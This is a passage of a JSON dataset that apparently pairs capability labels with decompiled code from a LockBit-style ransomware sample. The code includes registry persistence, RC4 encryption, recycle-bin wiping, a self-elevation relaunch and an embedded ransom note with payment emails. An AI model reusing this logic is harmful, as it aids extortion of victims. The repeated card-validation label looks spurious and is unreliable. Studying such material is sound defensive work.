fcn.0040d900(&var_10ch, &var_48h, &var_54h, &var_60h),  iVar1 == 0 &&\n           (iVar1 = fcn.0040cc20(&var_ch, *arg_8h, 0x100),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0040cc20(&var_3ch, *arg_8h + 0x100, 3),  iVar1 == 0 &&\n           ((iVar1 = fcn.0040cc20(&var_30h, *arg_8h + 0x103, 0x100),  iVar1 == 0 &&\n            (iVar1 = fcn.0040cc20(&var_18h, *arg_8h + 0x203, 0x80),  iVar1 == 0)))))) &&\n         (iVar1 = fcn.0040cc20(&var_24h, *arg_8h + 0x283, 0x80),  iVar1 == 0)))) &&\n       (((iVar1 = fcn.0040cc20(&var_48h, *arg_8h + 0x303, 0x80),  iVar1 == 0 &&\n         (iVar1 = fcn.0040cc20(&var_54h, *arg_8h + 899, 0x80),  iVar1 == 0)) &&\n        (iVar1 = fcn.0040cc20(&var_60h, *arg_8h + 0x403, 0x80),  iVar1 == 0)))) {\n        uVar2 = 1;\n    }\n    fcn.0040b400(&var_ch);\n    fcn.0040b400(&var_18h);\n    fcn.0040b400(&var_24h);\n    fcn.0040b400(&var_30h);\n    fcn.0040b400(&var_3ch);\n    fcn.0040b400(&var_48h);\n    fcn.0040b400(&var_54h);\n    fcn.0040b400(&var_60h);\n    fcn.0040d9d0(&var_10ch);\n    fcn.0040ec70(&var_2b0h);\n    fcn.0040e7d0(&var_4b4h);\n    return uVar2;\n}\n",
        "token_count": 1011
    },
    "00406ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value",
            "set registry value"
        ],
        "decompiled_code": "\nuint fcn.00406ec0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_374h;\n    uint var_170h;\n    uint var_30h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t pcchString;\n    uint var_ch;\n    uint hKey;\n    int32_t var_4h;\n    \n    iVar2 = sub.msvcrt.dll_malloc(0x483);\n    var_4h = iVar2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)\n                      (0x80000001, L\"SOFTWARE\\\\LockBit\", 0, 0, 0, 0xf003f, 0, &hKey, &var_18h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    if (iVar3 == 0) {\n        var_14h = 3;\n        var_ch = 0x500;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, 0x41139c, 0, &var_14h, 0x4157d8, &var_ch);\n        var_ch = 0x103;\n        iVar4 = (*pcVar1)(hKey, 0x4113a8, 0, &var_14h, iVar2, &var_ch);\n        if ((iVar3 != 0) || (iVar4 != 0)) {\n            iVar3 = fcn.004069f0(&var_4h);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            var_4h = 0x483;\n            iVar3 = fcn.00406820(iVar2, &var_4h);\n            pcVar1 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            if (iVar3 == 0) {\n                return 0;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, L\"full\", 0, 3, 0x4157d8, 0x500);\n            (*pcVar1)(hKey, L\"Public\", 0, 3, iVar2, 0x103);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    else {\n        iVar3 = fcn.004069f0(&var_4h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        var_4h = 0x483;\n        iVar3 = fcn.00406820(iVar2, &var_4h);\n        if (iVar3 == 0) {\n            return 0;\n        }\n    }\n    fcn.0040bb10(&var_30h);\n    fcn.0040bb10(&var_24h);\n    fcn.0040de00(0x415720, 0, 0);\n    iVar3 = fcn.0040c710(&var_30h, iVar2, 0x100);\n    if (((iVar3 == 0) && (iVar3 = fcn.0040c710(&var_24h, iVar2 + 0x100, 3),  iVar3 == 0)) &&\n       (iVar3 = fcn.0040dd50(0x415720, &var_30h, 0, 0, 0, &var_24h),  iVar3 == 0)) {\n        fcn.0040eca0(&var_170h);\n        fcn.0040e940(&var_374h);\n        sub.msvcrt.dll_free(iVar2);\n        uVar5 = sub.msvcrt.dll_malloc(0xf04);\n        pcchString = 0xf04;\n        iVar2 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(0x4157d8, 0x500, 1, uVar5, &pcchString);\n        if (iVar2 != 0) {\n            *0x416030 = pcchString + 0x2d6;\n            *0x41571c = sub.msvcrt.dll_malloc(*0x416030);\n            **0x41571c = 0;\n            puVar6 = \n            \"All your important files are encrypted!\\r\\nThere is  only one way to get your files back:\\r\\n1. Contact with us\\r\\n2. Send us 1 any encrypted your file and your personal key\\r\\n3. We will decrypt 1 file for test(maximum file size - 1 MB), its guarantee what we can decrypt your files\\r\\n4. Pay\\r\\n5. We send for you decryptor software\\r\\n\\r\\nWe accept Bitcoin\\r\\n\\r\\nAttention!\\r\\nDo not rename encrypted files.\\r\\nDo not try to decrypt using third party software, it may cause permanent data loss.\\r\\nDecryption of your files with the help of third parties may cause increased  price(they add their fee to our)\\r\\n\\r\\nContact information: goodmen@countermail.com\\r\\n\\r\\nBe sure to duplicate your message on the e-mail: goodmen@cock.li\\r\\n\\r\\nYour personal id: \\r\\n\"\n            ;\n            puVar7 = *0x41571c;\n            for (iVar2 = 0xb5; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = *puVar6;\n            fcn.004013a0(*0x41571c + 0x2d6, uVar5, pcchString);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1326
    },
    "00407200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop",
            "write file on Windows",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00407200(uint32_t lpString, uint arglist)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint32_t unaff_EDI;\n    uint pDst;\n    uint lpBuffer;\n    uint pSrc;\n    uint ARG_0;\n    uint var_220h;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint *puStack124;\n    int32_t iStack120;\n    uint *puStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint *puStack76;\n    char16_t *pcStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    char16_t *pcStack56;\n    char *pcStack52;\n    uint *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint *puStack28;\n    uint *lpSystemTime;\n    uint *puStack20;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0x40720d;\n    sub.ntdll.dll__chkstk();\n    var_ch = 0x400;\n    lpSystemTime = &fcn.00407200::ARG_0;\n    puStack20 = NULL;\n    puStack28 = 0x407222;\n    var_8h = unaff_EDI;\n    fcn.00401000();\n    var_ch = lpString;\n    puStack20 = 0x40722e;\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    puStack20 = &fcn.00407200::arglist;\n    lpSystemTime = lpString;\n    puStack28 = &fcn.00407200::ARG_0;\n    puStack32 = 0x407244;\n    iVar4 = (*_sym.imp.USER32.dll_wvsprintfA)();\n    puStack32 = &fcn.00407200::lpSystemTime;\n    puStack36 = 0x407250;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)();\n    puStack40 = var_8h & 0xffff;\n    puStack36 = &fcn.00407200::ARG_0;\n    puStack48 = var_ch & 0xffff;\n    puStack44 = var_ch >> 0x10;\n    pcStack56 = &fcn.00407200::pSrc;\n    pcStack52 = \"[%.2u:%.2u:%.2u] . %s\\r\\n\";\n    puStack60 = 0x407278;\n    (*_sym.imp.USER32.dll_wsprintfA)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar4 < iVar3) {\n        puStack36 = 0x407287;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0) {\n            return iVar3;\n        }\n    }\n    puStack36 = 0xfffffff5;\n    puStack40 = 0x407297;\n    (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n    puStack40 = &fcn.00407200::pDst;\n    puStack44 = &fcn.00407200::pSrc;\n    puStack48 = 0x4072ab;\n    (*_sym.imp.USER32.dll_CharToOemA)();\n    puStack48 = 0x4072ad;\n    puStack48 = (*pcVar2)();\n    pcVar2 = _sym.imp.USER32.dll_wsprintfW;\n    pcStack52 = &fcn.00407200::ARG_0;\n    puStack60 = &fcn.00407200::lpBuffer;\n    pcStack56 = L\"%S : %d\\r\\n\";\n    uStack64 = 0x4072c9;\n    (*_sym.imp.USER32.dll_wsprintfW)();\n    puStack48 = &fcn.00407200::var_220h;\n    pcStack52 = NULL;\n    pcStack56 = NULL;\n    puStack60 = NULL;\n    uStack64 = 0;\n    puStack68 = 0x4072e1;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    puStack76 = &fcn.00407200::var_220h;\n    pcStack72 = L\"%s\\\\resultlog.reg\";\n    uStack80 = 0x4072f0;\n    puStack68 = puStack76;\n    (*pcVar2)();\n    puStack92 = &fcn.00407200::var_220h;\n    puStack68 = NULL;\n    pcStack72 = 0x80000000;\n    puStack76 = 0x4;\n    uStack80 = 0;\n    uStack84 = 0;\n    uStack88 = 0x40000000;\n    uStack96 = 0x407312;\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    uStack96 = 2;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack112 = 0x407321;\n    uStack108 = uVar5;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)();\n    puVar6 = &fcn.00407200::lpBuffer;\n    do {\n        iVar1 = *puVar6;\n        puVar6 = puVar6 + 2;\n    } while (iVar1 != 0);\n    puStack116 = &fcn.00407200::var_4h;\n    uStack112 = 0;\n    iStack120 = (puVar6 - (&fcn.00407200::lpBuffer + 2) >> 1) * 2;\n    puStack124 = &fcn.00407200::lpBuffer;\n    uStack132 = 0x407357;\n    uStack128 = uVar5;\n    (*_sym.imp.KERNEL32.dll_WriteFile)();\n    uStack136 = 0x40735e;\n    uStack132 = uVar5;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return iVar3;\n}\n",
        "token_count": 1451
    },
    "00407430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407430(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint ARG_0;\n    uint var_2cch;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint *var_b4h;\n    uint *var_b0h;\n    uint *var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint ARG_1;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_1ch = 0x6d0063;\n    var_18h = 0x2e0064;\n    var_14h = 0x780065;\n    var_10h = 0x65;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &var_2cch, 0x104);\n    ARG_1 = 0x63002f;\n    var_20h._0_2_ = 0;\n    var_80h = 0x690020;\n    var_7ch = 0x610063;\n    var_78h = 0x6c0063;\n    var_74h = 0x200073;\n    var_70h = 0x730025;\n    var_6ch = 0x2f0020;\n    var_68h = 0x650073;\n    var_64h = 0x690074;\n    var_60h = 0x74006e;\n    var_5ch = 0x670065;\n    var_58h = 0x690072;\n    var_54h = 0x790074;\n    var_50h = 0x65006c;\n    var_4ch = 0x650076;\n    var_48h = 0x20006c;\n    var_44h = 0x65004d;\n    var_40h = 0x690064;\n    var_3ch = 0x6d0075;\n    var_38h = 0x260020;\n    var_34h = 0x200026;\n    var_30h = 0x740073;\n    var_2ch = 0x720061;\n    var_28h = 0x200074;\n    var_24h = 0x730025;\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &ARG_1, &var_2cch, &var_2cch);\n    pcVar1 = _sym.imp.SHELL32.dll_ShellExecuteExW;\n    var_ch = 0x750072;\n    var_8h = 0x61006e;\n    var_4h = 0x73;\n    do {\n        var_b4h = &var_ch;\n        var_c0h = 0x3c;\n        var_b0h = &var_1ch;\n        var_ach = &ARG_0;\n        var_bch = 0x400;\n        var_b8h = 0;\n        var_a8h = 0;\n        var_a4h = 0;\n        var_a0h = 0;\n        iVar2 = (*pcVar1)(&var_c0h);\n    } while (iVar2 == 0);\n    return 1;\n}\n",
        "token_count": 976
    },
    "00408ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "empty the recycle bin"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408ee0(uint arg_8h)\n\n{\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, arg_8h, 7);\n    fcn.00407e50(arg_8h);\n    return 0;\n}\n",
        "token_count": 65
    },
    "00408f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "empty the recycle bin",
            "get disk size"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408f10(int32_t arg_8h)\n\n{\n    uint var_2ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x430025;\n    var_10h._0_2_ = 0;\n    var_14h = 0x5c003a;\n    (*_sym.imp.USER32.dll_wsprintfW)(&var_2ch, &var_18h, arg_8h + 0x41);\n    (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceW)(&var_2ch, &var_ch, &var_8h, &var_4h, &arg_8h);\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, &var_2ch, 7);\n    fcn.00407e50(&var_2ch);\n    return 0;\n}\n",
        "token_count": 244
    },
    "00409080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409080(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0040ef10(arg_8h, 0x118);\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "004090a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004090a0(uint arg_8h)\n\n{\n    fcn.00401000(arg_8h, 0, 0x118);\n    return;\n}\n",
        "token_count": 42
    },
    "0040a2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2c0(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.0040a300(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 163
    },
    "0040a300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a300(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 0) {\n        iVar2 = fcn.0040a3d0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040ca70(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.0040ca70(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.0040a0f0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 262
    },
    "0040a470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a470(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_ch >> 0x1f;\n    arg_ch = (arg_ch ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_ch;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.0040a4b0(arg_8h, &var_ch);\n    return;\n}\n",
        "token_count": 146
    },
    "0040b400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b400(uint *arg_8h)\n\n{\n    if (arg_8h != NULL) {\n        if (arg_8h[2] != 0) {\n            fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0040baa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040baa0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (10000 < arg_ch) {\n        return 0xfffffff0;\n    }\n    if (*(arg_8h + 4) < arg_ch) {\n        iVar1 = sub.msvcrt.dll_calloc(arg_ch, 4);\n        if (iVar1 == 0) {\n            return 0xfffffff0;\n        }\n        if (*(arg_8h + 8) != 0) {\n            fcn.004013a0(iVar1, *(arg_8h + 8), *(arg_8h + 4) << 2);\n            fcn.0040ef10(*(arg_8h + 8), *(arg_8h + 4) << 2);\n            sub.msvcrt.dll_free(*(arg_8h + 8));\n        }\n        *(arg_8h + 4) = arg_ch;\n        *(arg_8h + 8) = iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "0040c360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c360(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 0;\n    var_10h = 1;\n    var_ch = 1;\n    iVar1 = fcn.0040a4b0(arg_10h, &var_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    iVar1 = fcn.0040a670(0, arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        var_8h = &var_4h;\n        var_10h = 1;\n        var_ch = 1;\n        var_4h = iVar1;\n        iVar2 = fcn.0040a4b0(arg_8h, &var_10h);\n        while (iVar2 < 0) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 0) {\n                iVar1 = fcn.0040a3d0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.0040ca70(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x0040c438;\n                }\n                iVar1 = fcn.0040ca70(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                var_4h = -var_4h;\n            }\n            else {\n                iVar1 = fcn.0040a0f0(arg_8h, arg_8h, arg_10h);\ncode_r0x0040c438:\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            *arg_8h = var_4h;\n            var_8h = &var_4h;\n            var_4h = 0;\n            var_10h = 1;\n            var_ch = 1;\n            iVar2 = fcn.0040a4b0(arg_8h, &var_10h);\n        }\n        iVar2 = fcn.0040a4b0(arg_8h, arg_10h);\n        while (-1 < iVar2) {\n            var_4h = *arg_8h;\n            if (*arg_10h * var_4h < 1) {\n                iVar1 = fcn.0040a0f0(arg_8h, arg_8h, arg_10h);\ncode_r0x0040c4cc:\n                iVar2 = var_4h;\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            else {\n                iVar1 = fcn.0040a3d0(arg_8h, arg_10h);\n                if (-1 < iVar1) {\n                    iVar1 = fcn.0040ca70(arg_8h, arg_8h, arg_10h);\n                    goto code_r0x0040c4cc;\n                }\n                iVar1 = fcn.0040ca70(arg_8h, arg_10h, arg_8h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                iVar2 = -var_4h;\n            }\n            *arg_8h = iVar2;\n            iVar2 = fcn.0040a4b0(arg_8h, arg_10h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 857
    },
    "0040c500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c500(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_10h = 1;\n    var_4h = arg_10h;\n    var_ch = 1;\n    fcn.0040c540(arg_8h, arg_ch, &var_10h);\n    return;\n}\n",
        "token_count": 121
    },
    "0040cb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb40(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = arg_10h >> 0x1f;\n    arg_10h = (arg_10h ^ uVar1) - uVar1;\n    var_8h = 1;\n    var_4h = &arg_10h;\n    var_ch = (uVar1 & 0xfffffffe) + 1;\n    fcn.0040cb80(arg_8h, arg_ch, &var_ch);\n    return;\n}\n",
        "token_count": 161
    },
    "0040cb80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb80(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_ch;\n    if (*arg_10h * iVar1 < 1) {\n        iVar2 = fcn.0040a0f0(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.0040a3d0(arg_ch, arg_10h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040ca70(arg_8h, arg_10h, arg_ch);\n            if (iVar2 != 0) {\n                return;\n            }\n            *arg_8h = -iVar1;\n            return;\n        }\n        iVar2 = fcn.0040ca70(arg_8h, arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 262
    },
    "0040d3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_4h;\n    var_4h = 1;\n    var_10h = 1;\n    var_ch = 1;\n    fcn.0040d2a0(arg_8h, &var_10h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 139
    },
    "0040d6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d6e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d760(arg_8h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040e560(arg_8h, 1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040f190(arg_8h + 8, arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x14, 0, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0040efe0(arg_8h + 0x2c, arg_8h + 0x38, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                     arg_8h + 0x5c);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 268
    },
    "0040d900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d900(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a470(arg_8h + 8, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.0040a470(arg_8h + 0x2c, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.0040a470(arg_8h + 0x38, 0);\n    if (iVar1 == 0) {\n        return -0x4080;\n    }\n    iVar1 = fcn.0040a470(arg_8h + 0x20, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040a470(arg_8h + 0x14, 0);\n        if (iVar1 == 0) {\n            return -0x4080;\n        }\n        if ((((arg_ch == 0) || (iVar1 = fcn.0040a590(arg_ch, arg_8h + 0x44),  iVar1 == 0)) &&\n            ((arg_10h == 0 || (iVar1 = fcn.0040a590(arg_10h, arg_8h + 0x50),  iVar1 == 0)))) &&\n           ((arg_14h == 0 || (iVar1 = fcn.0040a590(arg_14h, arg_8h + 0x5c),  iVar1 == 0)))) {\n            return 0;\n        }\n        return iVar1 + -0x4080;\n    }\n    return -0x4080;\n}\n",
        "token_count": 421
    },
    "0040d9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d9d0(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t arg_8h_00;\n    \n    if (arg_8h != 0) {\n        fcn.0040b400(arg_8h + 0x8c);\n        fcn.0040b400(arg_8h + 0x98);\n        fcn.0040b400(arg_8h + 0x68);\n        fcn.0040b400(arg_8h + 0x20);\n        fcn.0040b400(arg_8h + 0x38);\n        fcn.0040b400(arg_8h + 0x2c);\n        fcn.0040b400(arg_8h + 0x14);\n        fcn.0040b400(arg_8h + 8);\n        fcn.0040b400(arg_8h + 0x80);\n        fcn.0040b400(arg_8h + 0x74);\n        fcn.0040b400(arg_8h + 0x5c);\n        fcn.0040b400(arg_8h + 0x50);\n        if (arg_8h + 0x44 != NULL) {\n            arg_8h_00 = *(arg_8h + 0x4c);\n            if (arg_8h_00 != 0) {\n                arg_ch = *(arg_8h + 0x48) << 2;\n                fcn.0040ef10(arg_8h_00, arg_ch);\n                sub.msvcrt.dll_free(*(arg_8h + 0x4c), arg_8h_00, arg_ch, unaff_ESI, unaff_EBP);\n            }\n            *(arg_8h + 0x44) = 1;\n            *(arg_8h + 0x48) = 0;\n            *(arg_8h + 0x4c) = 0;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0040dd50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
